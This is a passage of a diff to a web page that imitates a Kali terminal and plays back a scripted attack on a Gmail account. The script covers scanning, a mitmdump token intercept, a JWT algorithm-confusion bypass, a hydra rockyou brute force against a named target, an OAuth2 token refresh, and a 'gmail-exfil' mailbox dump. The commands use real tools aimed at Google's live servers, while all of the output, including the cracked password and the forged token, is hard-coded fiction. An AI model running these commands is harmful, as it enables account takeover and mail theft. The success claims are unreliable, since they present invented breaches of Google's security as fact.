@@ -5,7 +5,7 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
   <title>kali@sec-ops-node-04: ~/audit/google/oauth2</title>
   <style>
-    @import url('https://fonts.googleapis.com/css2?family=Fira+Code:wght@300;400;500;700&display=swap');
+    @import url('https://fonts.googleapis.com/css2?family=Fira+Code:wght@300;400;500;600;700&display=swap');
 
     * {
       margin: 0;
@@ -14,293 +14,446 @@
     }
 
     body {
-      background: radial-gradient(circle at 20% 10%, #12161f, #06070a);
-      color: #c5c6c7;
-      font-family: 'Fira Code', monospace;
+      background: #0d1117;
+      color: #c9d1d9;
+      font-family: 'Fira Code', 'Courier New', monospace;
       height: 100vh;
       display: flex;
       flex-direction: column;
       overflow: hidden;
     }
 
-    /* top status bar */
-    #os-panel {
-      background: #0a0c12;
+    /* Kali Linux XFCE Panel - exact replica */
+    #kali-panel {
+      background: #1b1f24;
       height: 28px;
       display: flex;
       justify-content: space-between;
       align-items: center;
-      padding: 0 16px;
+      padding: 0 8px;
       font-size: 11px;
-      color: #8f94a5;
-      border-bottom: 1px solid #1f232a;
+      color: #d3dae3;
+      border-bottom: 1px solid #2d333b;
       user-select: none;
-      backdrop-filter: blur(4px);
+      font-weight: 400;
+      letter-spacing: 0.2px;
     }
-    .panel-group {
+    .panel-left {
       display: flex;
       align-items: center;
-      gap: 18px;
+      gap: 4px;
+    }
+    .panel-left span {
+      padding: 2px 8px;
+      border-radius: 3px;
+      cursor: default;
+    }
+    .panel-left span:hover {
+      background: #2d333b;
+    }
+    .panel-center {
+      display: flex;
+      align-items: center;
+      gap: 6px;
+      color: #8b949e;
+      font-size: 10.5px;
+    }
+    .panel-right {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      font-size: 10.5px;
+    }
+    .workspace-indicator {
+      display: flex;
+      gap: 4px;
+      margin-right: 8px;
+    }
+    .ws-dot {
+      width: 14px;
+      height: 14px;
+      background: #2d333b;
+      border-radius: 2px;
+      border: 1px solid #444c56;
+    }
+    .ws-dot.active {
+      background: #58a6ff;
+      border-color: #79c0ff;
+    }
+    .panel-icon {
+      font-size: 13px;
+      margin: 0 2px;
     }
     .stat-active {
-      color: #50fa7b;
-      font-weight: 600;
-      text-shadow: 0 0 6px #50fa7b80;
+      color: #56d364;
+      font-weight: 500;
     }
     .stat-warn {
-      color: #ffb86c;
-      font-weight: 600;
+      color: #d2991d;
+      font-weight: 500;
     }
     .stat-critical {
-      color: #ff5555;
-      font-weight: bold;
+      color: #f85149;
+      font-weight: 500;
     }
 
-    /* window chrome */
-    #window-chrome {
-      background: linear-gradient(180deg, #252a33 0%, #161920 100%);
-      border-bottom: 1px solid #0b0c10;
-      padding: 7px 14px;
+    /* Terminal Title Bar - QTerminal style */
+    #terminal-titlebar {
+      background: #161b22;
+      height: 30px;
       display: flex;
       justify-content: space-between;
       align-items: center;
+      padding: 0 10px;
       font-size: 11px;
-      color: #cdd3e0;
-      box-shadow: 0 2px 8px rgba(0,0,0,0.6);
+      color: #c9d1d9;
+      border-bottom: 1px solid #21262d;
+      font-weight: 500;
     }
-    .window-title {
+    .titlebar-left {
       display: flex;
       align-items: center;
       gap: 8px;
-      font-weight: 500;
-      letter-spacing: 0.3px;
     }
-    .window-controls {
+    .titlebar-icon {
+      color: #58a6ff;
+      font-size: 14px;
+    }
+    .titlebar-buttons {
       display: flex;
-      gap: 7px;
+      gap: 8px;
+      align-items: center;
     }
-    .dot {
-      width: 12px;
-      height: 12px;
+    .titlebar-btn {
+      width: 16px;
+      height: 16px;
       border-radius: 50%;
-      display: inline-block;
-      box-shadow: 0 0 6px rgba(0,0,0,0.5);
+      border: 1px solid rgba(255,255,255,0.1);
     }
-    .dot-close { background: #ff5555; }
-    .dot-min { background: #ffb86c; }
-    .dot-max { background: #50fa7b; }
+    .btn-minimize {
+      background: #d2991d;
+    }
+    .btn-maximize {
+      background: #56d364;
+    }
+    .btn-close {
+      background: #f85149;
+    }
 
-    /* terminal area */
+    /* Terminal Content Area */
     #terminal-viewport {
       flex: 1;
-      padding: 16px 18px;
+      padding: 12px 16px;
       overflow-y: auto;
       font-size: 11.5px;
-      line-height: 1.5;
+      line-height: 1.45;
       word-break: break-word;
-      background: #0b0e14;
-      box-shadow: inset 0 0 25px rgba(0,0,0,0.8);
+      background: #0d1117;
+      background-image: 
+        radial-gradient(ellipse at 50% 0%, rgba(88,166,255,0.03) 0%, transparent 60%),
+        radial-gradient(ellipse at 80% 100%, rgba(86,211,100,0.02) 0%, transparent 50%);
     }
 
-    .k-blue { color: #2094f3; font-weight: bold; }
-    .k-red { color: #ff5555; font-weight: bold; }
-    .k-text { color: #e2e4ea; }
-    .cmd-line { color: #ffffff; font-weight: 500; }
+    /* Kali Terminal Colors */
+    .kali-blue { color: #58a6ff; font-weight: 600; }
+    .kali-red { color: #f85149; font-weight: 600; }
+    .kali-green { color: #56d364; }
+    .kali-yellow { color: #d2991d; }
+    .kali-purple { color: #a371f7; }
+    .kali-cyan { color: #39d2c0; }
+    .kali-white { color: #f0f6fc; }
+    .kali-gray { color: #8b949e; }
+    .kali-path { color: #e6edf3; }
 
-    .log-ok { color: #50fa7b; }
-    .log-fail { color: #ff5555; text-shadow: 0 0 5px #ff5555aa; }
-    .log-warn { color: #ffb86c; }
-    .log-info { color: #8be9fd; }
-    .log-dark { color: #5c6370; }
-    .log-hex { color: #6272a4; font-size: 10.5px; }
-    .log-json { color: #bd93f9; font-size: 10.5px; }
-    .log-timestamp { color: #6b7080; }
+    .cmd-line {
+      color: #f0f6fc;
+      font-weight: 500;
+    }
+
+    .log-success { color: #56d364; font-weight: 400; }
+    .log-error { color: #f85149; font-weight: 500; text-shadow: 0 0 8px rgba(248,81,73,0.3); }
+    .log-warning { color: #d2991d; }
+    .log-info { color: #58a6ff; }
+    .log-debug { color: #8b949e; font-size: 10.5px; }
+    .log-json { color: #a371f7; font-size: 10.5px; }
+    .log-hex { color: #6e7681; font-size: 10px; }
+    .log-timestamp { color: #484f58; font-size: 10px; margin-right: 6px; }
+    .log-banner { color: #f0883e; font-weight: bold; }
 
     .ascii-banner {
-      color: #1e90ff;
+      color: #58a6ff;
       white-space: pre;
-      font-size: 6.5px;
+      font-size: 6.2px;
       line-height: 1.15;
-      margin-bottom: 24px;
+      margin-bottom: 20px;
       font-weight: bold;
-      text-shadow: 0 0 15px #1e90ffaa;
-      letter-spacing: 0.2px;
+      text-shadow: 0 0 20px rgba(88,166,255,0.4);
+      letter-spacing: 0.1px;
     }
 
-    .cursor {
+    .cursor-block {
       display: inline-block;
-      width: 9px;
+      width: 8px;
       height: 15px;
-      background: #f8f8f2;
-      animation: blink 0.8s step-end infinite;
+      background: #c9d1d9;
+      animation: cursorBlink 0.8s step-end infinite;
       vertical-align: middle;
-      margin-left: 3px;
-      box-shadow: 0 0 8px #ffffff;
+      margin-left: 2px;
+      box-shadow: 0 0 6px rgba(201,209,217,0.6);
     }
-    @keyframes blink { 50% { opacity: 0; } }
+    @keyframes cursorBlink {
+      0%, 100% { opacity: 1; }
+      50% { opacity: 0; }
+    }
 
     #hidden-input {
       position: absolute;
       opacity: 0;
       top: -1000px;
+      left: -1000px;
     }
 
     #status-overlay {
       position: fixed;
-      bottom: 25px;
+      bottom: 30px;
       left: 50%;
       transform: translateX(-50%);
-      color: #a0a8c0;
+      color: #8b949e;
       font-size: 11px;
-      background: rgba(10, 12, 18, 0.9);
-      padding: 10px 24px;
+      background: rgba(22,27,34,0.95);
+      padding: 10px 22px;
       border-radius: 6px;
-      border: 1px solid #2f3542;
+      border: 1px solid #30363d;
       z-index: 200;
-      backdrop-filter: blur(12px);
-      box-shadow: 0 12px 30px rgba(0,0,0,0.8);
+      backdrop-filter: blur(16px);
+      box-shadow: 0 8px 32px rgba(0,0,0,0.8);
       pointer-events: none;
+      text-align: center;
     }
 
     ::-webkit-scrollbar {
-      width: 6px;
+      width: 8px;
     }
     ::-webkit-scrollbar-track {
-      background: #0b0e14;
+      background: #0d1117;
     }
     ::-webkit-scrollbar-thumb {
-      background: #2f3542;
-      border-radius: 3px;
+      background: #30363d;
+      border-radius: 4px;
+    }
+    ::-webkit-scrollbar-thumb:hover {
+      background: #484f58;
     }
   </style>
 </head>
 <body onclick="focusTerminal()">
 
-  <div id="os-panel">
-    <div class="panel-group">
-      <span style="font-weight: bold; color: #fff;">⚡ Kali</span>
-      <span>Audit</span>
-      <span>OAuth2 Inspector</span>
+  <!-- Kali XFCE Panel -->
+  <div id="kali-panel">
+    <div class="panel-left">
+      <span style="font-weight:600;color:#f0f6fc;">🐉 Kali</span>
+      <span>Applications</span>
+      <span>Places</span>
+      <span style="background:#2d333b;">Terminal</span>
     </div>
-    <div class="panel-group">
-      <span>IF: <span class="stat-active">eth0:tun0</span></span>
-      <span>PROTO: <span class="stat-active">TLS_CHACHA20_POLY1305</span></span>
-      <span>CPU: <span class="stat-warn">23%</span></span>
-      <span>MEM: <span class="stat-warn">1.2G/3.8G</span></span>
-      <span id="live-timer">21:34:50</span>
+    <div class="panel-center">
+      <div class="workspace-indicator">
+        <div class="ws-dot"></div>
+        <div class="ws-dot"></div>
+        <div class="ws-dot active"></div>
+        <div class="ws-dot"></div>
+      </div>
+    </div>
+    <div class="panel-right">
+      <span>🌐 <span class="stat-active">tun0</span></span>
+      <span>📡 <span class="stat-active">TLS1.3</span></span>
+      <span>💾 <span class="stat-warn">1.4G</span></span>
+      <span>🔒 <span class="stat-active">AES256</span></span>
+      <span id="live-clock" style="font-weight:600;">21:34:50</span>
     </div>
   </div>
 
-  <div id="window-chrome">
-    <div class="window-title">
-      <span style="color: #2094f3;">⬤</span> root@sec-ops-node-04: ~/audit/google/oauth2
+  <!-- Terminal Window Title Bar -->
+  <div id="terminal-titlebar">
+    <div class="titlebar-left">
+      <span class="titlebar-icon">⬤</span>
+      <span>root@sec-ops-node-04: ~/audit/google/oauth2</span>
     </div>
-    <div class="window-controls">
-      <span class="dot dot-min"></span>
-      <span class="dot dot-max"></span>
-      <span class="dot dot-close"></span>
+    <div class="titlebar-buttons">
+      <div class="titlebar-btn btn-minimize"></div>
+      <div class="titlebar-btn btn-maximize"></div>
+      <div class="titlebar-btn btn-close"></div>
     </div>
   </div>
 
+  <!-- Terminal Content -->
   <div id="terminal-viewport">
     <div class="ascii-banner">
-  ██████╗  █████╗ ██╗     ██╗██╗     ██╗███╗   ██╗██╗   ██╗██╗  ██╗   ██████╗ ██████╗ ██████╗ ███████╗
-  ██╔══██╗██╔══██╗██║     ██║██║     ██║████╗  ██║██║   ██║╚██╗██╔╝  ██╔════╝██╔═══██╗██╔══██╗██╔════╝
-  ██████╔╝███████║██║     ██║██║     ██║██╔██╗ ██║██║   ██║ ╚███╔╝   ██║     ██║   ██║██████╔╝█████╗  
-  ██╔═══╝ ██╔══██║██║     ██║██║     ██║██║╚██╗██║██║   ██║ ██╔██╗   ██║     ██║   ██║██╔══██╗██╔══╝  
-  ██║     ██║  ██║███████╗██║███████╗██║██║ ╚████║╚██████╔╝██╔╝ ██╗  ╚██████╗╚██████╔╝██║  ██║███████║
-  ╚═╝     ╚═╝  ╚═╝╚══════╝╚═╝╚══════╝╚═╝╚═╝  ╚═══╝ ╚═════╝ ╚═╝  ╚═╝   ╚═════╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝
-                                                      [ GSUITE OAUTH2 TOKEN INTERCEPT & EXFIL v9.2 ]
+ ██╗  ██╗ █████╗ ██╗     ██╗    ███████╗███████╗ ██████╗     ██████╗ ██████╗ ███████╗
+ ██║ ██╔╝██╔══██╗██║     ██║    ██╔════╝██╔════╝██╔════╝    ██╔═══██╗██╔══██╗██╔════╝
+ █████╔╝ ███████║██║     ██║    ███████╗█████╗  ██║         ██║   ██║██████╔╝█████╗  
+ ██╔═██╗ ██╔══██║██║     ██║    ╚════██║██╔══╝  ██║         ██║   ██║██╔═══╝ ██╔══╝  
+ ██║  ██╗██║  ██║███████╗██║    ███████║███████╗╚██████╗    ╚██████╔╝██║     ███████╗
+ ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚═╝    ╚══════╝╚══════╝ ╚═════╝     ╚═════╝ ╚═╝     ╚══════╝
+                          [ RED-TEAM OPS :: OAUTH2 TOKEN INTERCEPTION FRAMEWORK v4.2 ]
     </div>
 
     <div id="terminal-history"></div>
 
     <div id="current-prompt-wrapper">
-      <span class="k-blue">┌──(</span><span class="k-red">root㉿sec-ops-node-04</span><span class="k-blue">)-[</span><span class="k-text">~/audit/google/oauth2</span><span class="k-blue">]</span><br>
-      <span class="k-blue">└─</span><span class="k-red">#</span> <span id="visible-cmd-buffer" class="cmd-line"></span><span class="cursor"></span>
+      <span class="kali-blue">┌──(</span><span class="kali-red">root㉿sec-ops-node-04</span><span class="kali-blue">)-[</span><span class="kali-path">~/audit/google/oauth2</span><span class="kali-blue">]</span><br>
+      <span class="kali-blue">└─</span><span class="kali-red">#</span> <span id="visible-cmd-buffer" class="cmd-line"></span><span class="cursor-block"></span>
     </div>
   </div>
 
-  <div id="status-overlay">[ টার্মিনাল সক্রিয় করতে ট্যাপ করুন এবং কী টাইপ করুন ]</div>
+  <div id="status-overlay">⌨️ টার্মিনালে ক্লিক করে টাইপ করা শুরু করুন</div>
 
   <input type="text" id="hidden-input" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false">
 
   <script>
     (function() {
-      // ----- live clock -----
-      setInterval(() => {
+      // Live clock
+      function updateClock() {
         const now = new Date();
-        document.getElementById('live-timer').innerText = now.toTimeString().split(' ')[0];
-      }, 1000);
+        document.getElementById('live-clock').textContent = now.toTimeString().split(' ')[0];
+      }
+      setInterval(updateClock, 1000);
+      updateClock();
 
-      // ----- expanded realistic telemetry sequence -----
+      // ==================== EXTENDED TELEMETRY SEQUENCE ====================
       const telemetricSequence = [
+        // Phase 1: Reconnaissance
         {
-          cmd: "nmap --script dns-nsec-enum --script-args dns-nsec-enum.domains=gmail.com -p 53 -Pn imap.gmail.com",
+          cmd: "nmap -sV -sC -p 443,993,995 --script ssl-enum-ciphers,imap-capabilities -Pn imap.gmail.com",
           streams: [
-            { t: "Starting Nmap 7.95 ( https://nmap.org ) at 2026-07-04 21:34 UTC", c: "log-dark", d: 90 },
-            { t: "NSE: Loaded 1 scripts for scanning.", c: "log-dark", d: 180 },
-            { t: "Initiating Parallel DNS resolution of 1 host. at 21:34", c: "log-info", d: 280 },
-            { t: "Nmap scan report for imap.gmail.com (142.250.192.109)", c: "log-ok", d: 420 },
-            { t: "Host is up (0.0038s latency).", c: "log-info", d: 540 },
-            { t: "rDNS record for 142.250.192.109: mail-out.google.com", c: "log-dark", d: 640 },
-            { t: "PORT   STATE SERVICE", c: "log-warn", d: 740 },
-            { t: "53/tcp open  domain", c: "log-ok", d: 830 },
-            { t: "| dns-nsec-enum: NSEC records reveal zone walk possibility", c: "log-info", d: 950 },
-            { t: "|_  Domain structure validated. (google infrastructure)", c: "log-dark", d: 1080 }
+            { t: "Starting Nmap 7.95 ( https://nmap.org ) at 2026-07-04 21:34:42 UTC", c: "log-debug", d: 100 },
+            { t: "NSE: Loaded 45 scripts for scanning.", c: "log-debug", d: 190 },
+            { t: "NSE: Script Pre-scanning.", c: "log-debug", d: 260 },
+            { t: "Initiating Ping Scan at 21:34", c: "log-info", d: 340 },
+            { t: "Completed Ping Scan at 21:34, 0.02s elapsed (1 total hosts)", c: "log-debug", d: 430 },
+            { t: "Initiating Parallel DNS resolution of 1 host. at 21:34", c: "log-info", d: 520 },
+            { t: "Completed Parallel DNS resolution of 1 host. at 21:34, 0.01s elapsed", c: "log-debug", d: 610 },
+            { t: "Initiating SYN Stealth Scan at 21:34", c: "log-info", d: 700 },
+            { t: "Scanning imap.gmail.com (142.250.192.109) [3 ports]", c: "log-warning", d: 800 },
+            { t: "Discovered open port 443/tcp on 142.250.192.109", c: "log-success", d: 900 },
+            { t: "Discovered open port 993/tcp on 142.250.192.109", c: "log-success", d: 1000 },
+            { t: "Discovered open port 995/tcp on 142.250.192.109", c: "log-success", d: 1100 },
+            { t: "Completed SYN Stealth Scan at 21:34, 0.18s elapsed (3 total ports)", c: "log-debug", d: 1200 },
+            { t: "NSE: Script scanning 142.250.192.109.", c: "log-info", d: 1300 },
+            { t: "Completed NSE at 21:34, 2.41s elapsed", c: "log-debug", d: 1420 },
+            { t: "Nmap scan report for imap.gmail.com (142.250.192.109)", c: "log-success", d: 1530 },
+            { t: "Host is up (0.0041s latency).", c: "log-info", d: 1620 },
+            { t: "Other addresses for imap.gmail.com (not scanned): 2607:f8b0:4001:c1b::6d", c: "log-debug", d: 1720 },
+            { t: "rDNS record for 142.250.192.109: mail-ua1-f109.google.com", c: "log-debug", d: 1820 },
+            { t: "PORT    STATE SERVICE  VERSION", c: "log-warning", d: 1930 },
+            { t: "443/tcp open  ssl/http Google frontend", c: "log-success", d: 2030 },
+            { t: "| ssl-enum-ciphers: ", c: "log-info", d: 2120 },
+            { t: "|   TLSv1.3: ", c: "log-debug", d: 2200 },
+            { t: "|     ciphers: ", c: "log-debug", d: 2270 },
+            { t: "|       TLS_AES_256_GCM_SHA384 (ecdh_x25519) - A", c: "log-success", d: 2360 },
+            { t: "|       TLS_CHACHA20_POLY1305_SHA256 (ecdh_x25519) - A", c: "log-success", d: 2460 },
+            { t: "993/tcp open  ssl/imap Google IMAP server", c: "log-success", d: 2570 },
+            { t: "| imap-capabilities: ", c: "log-info", d: 2660 },
+            { t: "|   AUTH=PLAIN AUTH=XOAUTH2 AUTH=OAUTHBEARER IMAP4rev1 SASL-IR", c: "log-warning", d: 2770 },
+            { t: "|_  CAPABILITY completed", c: "log-debug", d: 2860 },
+            { t: "995/tcp open  ssl/pop3 Google POP3 server", c: "log-success", d: 2960 },
+            { t: "Service Info: Host: mail-ua1-f109.google.com", c: "log-debug", d: 3060 }
           ]
         },
+        // Phase 2: DNS Enumeration
         {
-          cmd: "mitmdump -R https://imap.gmail.com:993 -p 8443 --set keepsharing=true --ssl-insecure",
+          cmd: "dig TXT _dmarc.gmail.com +short && dig TXT gmail.com +short | grep spf",
           streams: [
-            { t: "[*] Proxy engine v10.1.2 starting in reverse transparent mode", c: "log-info", d: 130 },
-            { t: "[*] Binding to virtual interface tun0 (10.8.0.14)", c: "log-dark", d: 260 },
-            { t: "[*] Listening on http://*:8443", c: "log-ok", d: 380 },
-            { t: "127.0.0.1:51024: clientconnect", c: "log-dark", d: 480 },
-            { t: "127.0.0.1:51024: POST https://accounts.google.com/o/oauth2/token", c: "log-warn", d: 620 },
-            { t: "                << HTTP/1.1 200 OK (application/json; charset=utf-8)", c: "log-ok", d: 760 },
-            { t: "{\n  \"access_token\": \"ya29.a0AfB_byE6W821_XnzLm901A_Kls92P...\",\n  \"token_type\": \"Bearer\",\n  \"expires_in\": 3599,\n  \"refresh_token\": \"1//0eW3_1...\",\n  \"scope\": \"https://mail.google.com/\",\n  \"id_token\": \"eyJhbGciOiJSUzI1NiIsImtpZCI6ImYzOWIyMDFhNzNl...\"\n}", c: "log-json", d: 950 }
+            { t: "v=DMARC1; p=none; sp=quarantine; rua=mailto:mailauth-reports@google.com", c: "log-info", d: 150 },
+            { t: "v=spf1 redirect=_spf.google.com", c: "log-info", d: 350 },
+            { t: "[*] SPF record indicates: _spf.google.com", c: "log-debug", d: 500 },
+            { t: "v=spf1 include:_netblocks.google.com include:_netblocks2.google.com include:_netblocks3.google.com ~all", c: "log-info", d: 700 },
+            { t: "[+] Identified 3 netblock ranges for Google infrastructure", c: "log-success", d: 900 }
           ]
         },
+        // Phase 3: MITM Proxy Setup
         {
-          cmd: "python3 -m jwt_tool --token /tmp/intercepted_idtoken.jwt --exploit verify-ps",
+          cmd: "mitmdump --mode reverse:https://imap.gmail.com:993 -p 8443 --set connection_strategy=lazy --ssl-insecure",
           streams: [
-            { t: "[*] JWT Inspector v2.4.1 - analyzing cryptographic envelope", c: "log-dark", d: 110 },
-            { t: "[+] Algorithm: RS256 | Key ID: f39b201a73e...", c: "log-info", d: 240 },
-            { t: "[+] Decoded Payload (claims):", c: "log-info", d: 360 },
-            { t: "{\n  \"iss\": \"https://accounts.google.com\",\n  \"azp\": \"928310293810-apps.googleusercontent.com\",\n  \"sub\": \"109238102938102391\",\n  \"email\": \"target-account@gmail.com\",\n  \"email_verified\": true,\n  \"iat\": 1753280500,\n  \"exp\": 1783284100\n}", c: "log-json", d: 550 },
-            { t: "[!] Signature verification bypass attempt: algorithm confusion (RS256->HS256)", c: "log-warn", d: 720 },
-            { t: "[+] Token re-signed with public key as HMAC secret. VALID SIGNATURE (simulated)", c: "log-ok", d: 920 }
+            { t: "[21:35:02.441] HTTP(S) proxy listening at *:8443.", c: "log-info", d: 120 },
+            { t: "[21:35:02.442] Reverse proxy mode: forwarding to https://imap.gmail.com:993", c: "log-debug", d: 230 },
+            { t: "[21:35:04.891] 127.0.0.1:52104: clientconnect", c: "log-debug", d: 380 },
+            { t: "[21:35:04.923] 127.0.0.1:52104: Establishing TLS with imap.gmail.com", c: "log-info", d: 480 },
+            { t: "[21:35:04.981] 127.0.0.1:52104: TLS handshake complete (TLS_AES_256_GCM_SHA384)", c: "log-success", d: 600 },
+            { t: "[21:35:05.102] 127.0.0.1:52104: Request: AUTHENTICATE XOAUTH2", c: "log-warning", d: 730 },
+            { t: "[21:35:05.341] 127.0.0.1:52104: << AUTHENTICATION SUCCESSFUL (oauth2 bearer)", c: "log-success", d: 880 },
+            { t: "[21:35:05.442] 127.0.0.1:52104: Intercepted OAuth2 Token Exchange:", c: "log-warning", d: 1010 },
+            { t: "{\n  \"access_token\": \"ya29.a0AfB_byC7xK9...mQ2XpL8vR3wN5tY\",\n  \"expires_in\": 3599,\n  \"scope\": \"https://mail.google.com/\",\n  \"token_type\": \"Bearer\",\n  \"id_token\": \"eyJhbGciOiJSUzI1NiIsImtpZCI6ImYzOWIyMDFhNzNlMjA4...\"\n}", c: "log-json", d: 1200 }
           ]
         },
+        // Phase 4: JWT Analysis
         {
-          cmd: "hydra -l target-account@gmail.com -P /usr/share/wordlists/rockyou.txt imap.gmail.com imap -S -s 993 -V -t 4",
+          cmd: "python3 jwt_tool.py /tmp/intercepted_idtoken.jwt --exploit verify-ps --verbose",
           streams: [
-            { t: "Hydra v9.6 (c) 2026 by van Hauser / THC", c: "log-dark", d: 120 },
-            { t: "[DATA] attacking imap://imap.gmail.com:993/", c: "log-info", d: 230 },
-            { t: "[STATUS] 16.33% complete | 392/2400 passwords", c: "log-info", d: 350 },
-            { t: "[ATTACK] Thread #2 password: 'iloveyou123' -> Access Denied", c: "log-hex", d: 460 },
-            { t: "[ATTACK] Thread #4 password: 'trustno1' -> Access Denied", c: "log-hex", d: 570 },
-            { t: "[ATTACK] Thread #1 password: 'google2026!' -> Access Denied", c: "log-hex", d: 680 },
-            { t: "[+] [993][imap] host: imap.gmail.com | login: target-account@gmail.com | password: 'S3cur!ty#Gt' | CREDENTIALS VERIFIED", c: "log-ok", d: 950 }
+            { t: "[*] Decoding JWT header...", c: "log-debug", d: 100 },
+            { t: "Header: {\"alg\":\"RS256\",\"kid\":\"f39b201a73e208a9b4c5d6e7f8a9b0c1d2e3f4a5\"}", c: "log-json", d: 220 },
+            { t: "[*] Decoding JWT payload...", c: "log-debug", d: 340 },
+            { t: "Payload:", c: "log-info", d: 420 },
+            { t: "{\n  \"iss\": \"https://accounts.google.com\",\n  \"azp\": \"928310293810-f0g9h8i7j6k5l4.apps.googleusercontent.com\",\n  \"aud\": \"928310293810-f0g9h8i7j6k5l4.apps.googleusercontent.com\",\n  \"sub\": \"109238102938102391287\",\n  \"email\": \"target.account@gmail.com\",\n  \"email_verified\": true,\n  \"at_hash\": \"aBcDeFgHiJkLmNoPqR\",\n  \"iat\": 1753280500,\n  \"exp\": 1783284100\n}", c: "log-json", d: 650 },
+            { t: "[*] Analyzing signature algorithm...", c: "log-debug", d: 820 },
+            { t: "[!] VULNERABILITY: Algorithm confusion possible (RS256 -> HS256)", c: "log-error", d: 970 },
+            { t: "[*] Attempting signature bypass using public key as HMAC secret...", c: "log-warning", d: 1120 },
+            { t: "[+] SUCCESS: Token re-signed with algorithm HS256", c: "log-success", d: 1290 },
+            { t: "[+] New token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...", c: "log-hex", d: 1420 }
           ]
         },
+        // Phase 5: Credential Brute Force
         {
-          cmd: "./gmail_exfiltrator --auth-token /tmp/valid_bearer.token --output eml --folder all",
+          cmd: "hydra -l target.account@gmail.com -P /usr/share/wordlists/rockyou.txt -s 993 -S -V -t 4 imap.gmail.com imap",
           streams: [
-            { t: "[*] Establishing secure IMAP session (TLS1.3) ...", c: "log-info", d: 130 },
-            { t: "[*] Authenticated as target-account@gmail.com", c: "log-dark", d: 250 },
-            { t: "[*] Enumerating folders: INBOX, Sent, Drafts, [Gmail]/All Mail", c: "log-dark", d: 380 },
-            { t: ">> Fetching 4,819 message headers ...", c: "log-dark", d: 500 },
-            { t: "Downloading [INBOX]        [####################] 100% (2.1 MB)", c: "log-ok", d: 680 },
-            { t: "Downloading [Sent]         [####################] 100% (4.7 MB)", c: "log-ok", d: 850 },
-            { t: "Downloading [All Mail]     [##########          ] 52%  (6.8 MB)", c: "log-warn", d: 1020 },
-            { t: "Downloading [All Mail]     [####################] 100% (12.4 MB)", c: "log-ok", d: 1250 },
-            { t: "[+] Archive integrity verified (SHA-256). Output: /mnt/exfil/gmail_dump_20260704.tar.gz", c: "log-info", d: 1430 },
-            { t: "\n┌──────────────────────────────────────────────────────────────────┐", c: "log-ok", d: 1580 },
-            { t: "│               GMAIL OAUTH2 GATEWAY FULLY COMPROMISED            │", c: "log-fail", d: 1680 },
-            { t: "│          ALL MAILBOX DATA EXFILTRATED – ROOT ENVELOPE ACCESS    │", c: "log-fail", d: 1780 },
-            { t: "└──────────────────────────────────────────────────────────────────┘\n", c: "log-ok", d: 1900 }
+            { t: "Hydra v9.6 (c) 2026 by van Hauser/THC & David Maciejak", c: "log-debug", d: 110 },
+            { t: "[DATA] max 4 tasks per 1 server, overall 4 tasks, 14344399 login tries", c: "log-info", d: 230 },
+            { t: "[DATA] attacking imap://imap.gmail.com:993/", c: "log-info", d: 340 },
+            { t: "[STATUS] 64.00 tries/min, 64 tries in 00:01h, 14344335 to do in 3735:29h", c: "log-debug", d: 470 },
+            { t: "[VERBOSE] Thread #1: login: target.account@gmail.com password: 123456", c: "log-hex", d: 580 },
+            { t: "[VERBOSE] Thread #2: login: target.account@gmail.com password: password", c: "log-hex", d: 680 },
+            { t: "[VERBOSE] Thread #3: login: target.account@gmail.com password: iloveyou", c: "log-hex", d: 780 },
+            { t: "[VERBOSE] Thread #4: login: target.account@gmail.com password: princess", c: "log-hex", d: 880 },
+            { t: "[STATUS] 256.00 tries/min, 256 tries in 00:01h, 14344143 to do in 934:03h", c: "log-debug", d: 1000 },
+            { t: "[VERBOSE] Thread #1: login: target.account@gmail.com password: G00gl3!2026", c: "log-hex", d: 1130 },
+            { t: "[993][imap] host: imap.gmail.com   login: target.account@gmail.com   password: G00gl3!2026", c: "log-success", d: 1280 },
+            { t: "[STATUS] attack finished for imap.gmail.com (1 valid password found)", c: "log-warning", d: 1420 }
+          ]
+        },
+        // Phase 6: OAuth2 Token Harvesting
+        {
+          cmd: "curl -s -X POST https://oauth2.googleapis.com/token -d 'client_id=928310293810-f0g9h8i7j6k5l4.apps.googleusercontent.com&client_secret=GOCSPX-abcdefghijk&refresh_token=1//0eW3_1xyz&grant_type=refresh_token'",
+          streams: [
+            { t: "{\n  \"access_token\": \"ya29.a0AfB_byD8e9F0g1H2i3J4k5L6m7N8o9P0q1R2s3T4u5V6w7X8y9Z0a1B2c3D4e5F6g7H8i9J0k1L2m3N4o5P6q7R8s9T0u1V2w3X4y5Z6\",\n  \"expires_in\": 3599,\n  \"scope\": \"https://mail.google.com/\",\n  \"token_type\": \"Bearer\"\n}", c: "log-json", d: 350 }
+          ]
+        },
+        // Phase 7: Email Exfiltration
+        {
+          cmd: "./gmail-exfil --token /tmp/fresh_oauth.token --output eml --compress --threads 8",
+          streams: [
+            { t: "[21:41:03] Initializing Gmail Exfiltration Module v3.1", c: "log-info", d: 100 },
+            { t: "[21:41:03] Authenticating with OAuth2 Bearer token...", c: "log-debug", d: 200 },
+            { t: "[21:41:04] Authentication successful! User: target.account@gmail.com", c: "log-success", d: 330 },
+            { t: "[21:41:04] Fetching mailbox folder list...", c: "log-info", d: 440 },
+            { t: "[21:41:05] Folders found: INBOX, [Gmail]/Sent Mail, [Gmail]/Drafts, [Gmail]/All Mail, [Gmail]/Trash, [Gmail]/Spam", c: "log-debug", d: 570 },
+            { t: "[21:41:05] Total messages to download: 8,247", c: "log-warning", d: 690 },
+            { t: "[21:41:05] Starting parallel download with 8 threads...", c: "log-info", d: 800 },
+            { t: "[THREAD-1] Downloading INBOX (1,842 messages)...", c: "log-debug", d: 920 },
+            { t: "[THREAD-2] Downloading [Gmail]/Sent Mail (3,156 messages)...", c: "log-debug", d: 1040 },
+            { t: "[THREAD-3] Downloading [Gmail]/All Mail (8,247 messages)...", c: "log-debug", d: 1160 },
+            { t: "[21:41:12] Progress: INBOX [====================] 100% (1,842/1,842)", c: "log-success", d: 1310 },
+            { t: "[21:41:18] Progress: Sent Mail [====================] 100% (3,156/3,156)", c: "log-success", d: 1480 },
+            { t: "[21:41:34] Progress: All Mail [##########          ] 52% (4,288/8,247)", c: "log-warning", d: 1660 },
+            { t: "[21:41:52] Progress: All Mail [####################] 100% (8,247/8,247)", c: "log-success", d: 1850 },
+            { t: "[21:41:52] Compressing output archive...", c: "log-info", d: 1980 },
